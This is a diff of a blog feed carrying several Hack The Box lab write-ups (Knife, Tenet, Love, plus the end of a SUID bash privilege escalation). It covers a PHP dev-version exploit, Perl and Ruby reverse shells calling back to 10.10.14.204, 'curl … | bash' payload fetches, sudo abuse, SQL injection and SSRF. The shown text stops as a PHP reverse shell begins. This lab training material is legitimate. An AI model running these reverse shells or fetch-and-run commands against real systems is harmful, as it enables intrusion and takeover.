+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;1 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; .version
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /bin/bash &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +s bash
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;--preserve=mode&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This will expand to the following command&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; .version &lt;span class=&quot;nt&quot;&gt;--preserve&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mode bash /etc/bind/named.bindmgr/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And since we used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod +s bash&lt;/code&gt;, the resulting file will be owned by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; and will have the SUID bit set, allowing it to be executed as root. Using the following, we will execute this and make the copy.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/local/bin/bindmgr.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we should have a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt; as root with the SUID bit set&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-larth&lt;/span&gt; /etc/bind/named.bindmgr
+total 1.2M
+&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt; 1 root &lt;span class=&quot;nb&quot;&gt;bind    &lt;/span&gt;2 Jun 18 08:30 .version
+&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt; 1 root &lt;span class=&quot;nb&quot;&gt;bind &lt;/span&gt;1.2M Jun 18 08:30 bash
+drwxr-sr-x 3 root &lt;span class=&quot;nb&quot;&gt;bind &lt;/span&gt;4.0K Jun 18 08:30 ..
+drwxr-sr-x 2 root &lt;span class=&quot;nb&quot;&gt;bind &lt;/span&gt;4.0K Jun 18 08:30 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Great! Lets give it a try and execute this bash, but before we do we must look at the bash manual, specifically this portion:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no startup files are read, shell functions are not  inherited  from  the  environment,  the SHELLOPTS,  BASHOPTS,  CDPATH, and GLOBIGNORE variables, if they appear in the environment, are ignored, and the effective user id is set to the real user id.  If the -p option is supplied at invocation, the startup behavior is the same, but the effective user id is not reset.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;So, if we just execute the bash, it will detect that the effective user (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;) differs from the real user (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bindmgr&lt;/code&gt;) and will set the effective user to the real user, causing it to execute as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bindmgr&lt;/code&gt; and not &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;. So we need to pass the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p&lt;/code&gt; option to prevent this from happening.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/etc/bind/named.bindmgr/bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
+bash-5.0# &lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;root
+bash-5.0#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Success!!!! We are now root!&lt;/p&gt;</content><author><name>Alex Loney</name></author><category term="blog" /><category term="writeup" /><category term="htb" /><category term="htb" /><category term="htb medium" /><category term="offsec" /><summary type="html">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</summary></entry><entry><title type="html">HTB: Knife Writeup</title><link href="/blog/writeup/htb/htb-knife/" rel="alternate" type="text/html" title="HTB: Knife Writeup" /><published>2021-06-13T23:14:00-07:00</published><updated>2021-06-13T23:14:00-07:00</updated><id>/blog/writeup/htb/htb-knife</id><content type="html" xml:base="/blog/writeup/htb/htb-knife/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+&lt;p&gt;I began the same as always, with an nmap scan&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.91 scan initiated Fri Jun 11 13:42:53 2021 as: nmap -sC -sV -oA nmap/knife 10.10.10.242&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.242
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.090s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title:  Emergent Medical Idea
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Nmap done at Fri Jun 11 13:43:12 2021 -- 1 IP address (1 host up) scanned in 18.50 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Browsing to port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt;, there doesn’t appear to be much on it. Running Nikto to see if anything interesting pops up&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nikto &lt;span class=&quot;nt&quot;&gt;-host&lt;/span&gt; http://10.10.10.242
+- Nikto v2.1.6
+&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
++ Target IP:          10.10.10.242
++ Target Hostname:    10.10.10.242
++ Target Port:        80
++ Start Time:         2021-06-11 13:45:33 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
++ Server: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Retrieved x-powered-by header: PHP/8.1.0-dev
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
++ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;&apos;-C all&apos;&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Web Server returns a valid response with junk HTTP methods, this may cause &lt;span class=&quot;nb&quot;&gt;false &lt;/span&gt;positives.
++ 7863 requests: 0 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 5 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
++ End Time:           2021-06-11 13:56:18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;645 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
++ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;That’s something interesting, a dev version of PHP, doing a little google search reveals &lt;a href=&quot;https://www.exploit-db.com/exploits/49933&quot;&gt;exploit-db 49933&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Running it instantly gives a stateless interactive shell!&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 49933.py
+Enter the full host url:
+http://10.10.10.242
+
+Interactive shell is opened on http://10.10.10.242 
+Can&lt;span class=&quot;s1&quot;&gt;&apos;t acces tty; job crontol turned off.
+$ whoami
+james
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Crafting a simple perl reverse shell&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;rshell.pl
+perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;use Socket;$i=&quot;10.10.14.204&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And piping that through bash&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl 10.10.14.204/rshell.pl | bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Success! We now have an ok interactive shell!&lt;/p&gt;
+
+&lt;h1 id=&quot;privesc&quot;&gt;Privesc&lt;/h1&gt;
+
+&lt;p&gt;After a big of looking around, it turns out that we can execute the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;knife&lt;/code&gt; programs as root. Exploring the help, there’s a very interesting line&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;** EXEC COMMANDS **
+knife exec [SCRIPT] (options)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can execute commands commands? Well that seems nice. After playing with this a bit, it turns out that it’s allows execution of Ruby scripts. So I crafted a little Ruby reverse shell as follows:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;rshell.rb
+&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;perl -e &apos;use Socket;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10.10.14.204&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;tcp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;));if(connect(S,sockaddr_in(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,inet_aton(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)))){open(STDIN,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;gt;&amp;amp;S&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;);open(STDOUT,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;gt;&amp;amp;S&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;);open(STDERR,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;gt;&amp;amp;S&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;);exec(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/bin/sh -i&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;);};&apos;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Copied it over to the server and executed it with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;knife&lt;/code&gt; program&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget 10.10.14.204/rshell.rb
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;knife &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; /tmp/rshell.rb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And catching that reverse shell gives us root!!&lt;/p&gt;</content><author><name>Alex Loney</name></author><category term="blog" /><category term="writeup" /><category term="htb" /><category term="htb" /><category term="htb easy" /><category term="offsec" /><summary type="html">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</summary></entry><entry><title type="html">HTB: Tenet Writeup</title><link href="/blog/writeup/htb/htb-tenet/" rel="alternate" type="text/html" title="HTB: Tenet Writeup" /><published>2021-06-12T12:00:00-07:00</published><updated>2021-06-12T12:00:00-07:00</updated><id>/blog/writeup/htb/htb-tenet</id><content type="html" xml:base="/blog/writeup/htb/htb-tenet/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
 
 &lt;hr /&gt;
 
@@ -170,7 +823,313 @@ Mysql Pass: Opera2112&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/local/bin/enableSSH.sh
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;After executing the above a few times to make sure that the SSH key has made it in, we can then SSH in as root!&lt;/p&gt;</content><author><name>Alex Loney</name></author><category term="blog" /><category term="writeup" /><category term="htb" /><category term="htb" /><category term="htb medium" /><category term="offsec" /><summary type="html">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</summary></entry><entry><title type="html">HTB: Spectra Writeup</title><link href="/blog/writeup/htb/htb-spectra/" rel="alternate" type="text/html" title="HTB: Spectra Writeup" /><published>2021-06-08T12:22:00-07:00</published><updated>2021-06-08T12:22:00-07:00</updated><id>/blog/writeup/htb/htb-spectra</id><content type="html" xml:base="/blog/writeup/htb/htb-spectra/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
+&lt;p&gt;After executing the above a few times to make sure that the SSH key has made it in, we can then SSH in as root!&lt;/p&gt;</content><author><name>Alex Loney</name></author><category term="blog" /><category term="writeup" /><category term="htb" /><category term="htb" /><category term="htb medium" /><category term="offsec" /><summary type="html">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</summary></entry><entry><title type="html">HTB: Love Writeup</title><link href="/blog/writeup/htb/htb-love/" rel="alternate" type="text/html" title="HTB: Love Writeup" /><published>2021-06-11T23:13:00-07:00</published><updated>2021-06-11T23:13:00-07:00</updated><id>/blog/writeup/htb/htb-love</id><content type="html" xml:base="/blog/writeup/htb/htb-love/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+&lt;p&gt;I began by the standard enumeration flow, using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.91 scan initiated Wed Jun  9 13:19:10 2021 as: nmap -sC -sV -oA nmap/love 10.10.10.239&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.239
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.26s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 993 closed ports
+PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Apache httpd 2.4.46 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Win64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; OpenSSL/1.1.1j PHP/7.3.27&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+443/tcp  open  ssl/http     Apache httpd 2.4.46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;OpenSSL/1.1.1j PHP/7.3.27&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+...&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;snip&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;...
+| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;staging.love.htb/organizationName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ValentineCorp/stateOrProvinceName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;m/countryName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;
+...&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;snip&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;...
+445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+3306/tcp open  mysql?
+5000/tcp open  http         Apache httpd 2.4.46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;OpenSSL/1.1.1j PHP/7.3.27&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Nmap done at Wed Jun  9 13:21:32 2021 -- 1 IP address (1 host up) scanned in 142.98 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So, there are a few interesting things that may be seen. Visiting port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; shows a voting system, port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5000&lt;/code&gt; just shows an Access Denied page, and the SSL certificate from port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;443&lt;/code&gt; shows a different name (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;staging.love.htb&lt;/code&gt;).&lt;/p&gt;
+
+&lt;h2 id=&quot;voting-system-port-80&quot;&gt;Voting System (port 80)&lt;/h2&gt;
+&lt;p&gt;I spent a while on this, the first thing I noticed is that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;voter&lt;/code&gt; field is vulnerable to a timing SQL injection, using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlmap&lt;/code&gt; I was able to pull the following credentials from it:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin:$2y$10$4E3VVe2PWlTMejquTmMD6.Og9RmmFN.K5A1n99kHNdQxHePutFjsC
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Unfortunately, throwing that hash into JTR and Hashcat reveals nothing, so that appears to be a deadend.&lt;/p&gt;
+
+&lt;p&gt;Continuing with the voting system enumeration, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; reveals that there are multiple directories with listings open and other additonal directories.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/admin
+/includes
+/images
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Those both could be interesting, but lets check out the other ports&lt;/p&gt;
+
+&lt;h2 id=&quot;file-scanning-staginglovehtb&quot;&gt;File Scanning (staging.love.htb)&lt;/h2&gt;
+&lt;p&gt;Adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.239 staging.love.htb&lt;/code&gt; to my &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file, I’m able to access this new site. It has a notification system (that doesn’t do anything) and a demo file scan. The demo file scan will download and display a file that you give it.&lt;/p&gt;
+
+&lt;h2 id=&quot;forbidden-port-5000&quot;&gt;Forbidden (port 5000)&lt;/h2&gt;
+&lt;p&gt;There’s another HTTP instance running on port 5000, but whenever visiting this page or attempting to access any subdirectories from it, I simply receive a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;403 Forbidden&lt;/code&gt; error.&lt;/p&gt;
+
+&lt;h3 id=&quot;accessing-forbidden&quot;&gt;Accessing Forbidden&lt;/h3&gt;
+&lt;p&gt;This part took me a long time to figure out, longer than it likely should have, but if you use the file scanner from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;staging.love.htb&lt;/code&gt; to scan &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1:5000&lt;/code&gt;, it can access the page! It’ll return&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Vote Admin Creds admin: @LoveIsInTheAir!!!!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;vote-login&quot;&gt;Vote Login&lt;/h2&gt;
+&lt;p&gt;Given the previous credentials pulled fromt he forbitten page, I was then able to access the admin page located at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;love.htb/admin&lt;/code&gt; using the credentials &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:@LoveIsInTheAir!!!!&lt;/code&gt;!&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-a-shell&quot;&gt;Getting a Shell&lt;/h2&gt;
+&lt;p&gt;Now that I have admin login, it’s time to look around. I immediately notice that I can create a user and upload a photo. I wonder if there’s any validate that this is a valid photo?&lt;/p&gt;
+
+&lt;p&gt;Since this is a PHP website running on a Windows machine (all stuff I know from the nmap scan and the file extensions in the URL), I crafted a PHP PowerShell reverse shell payload:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+
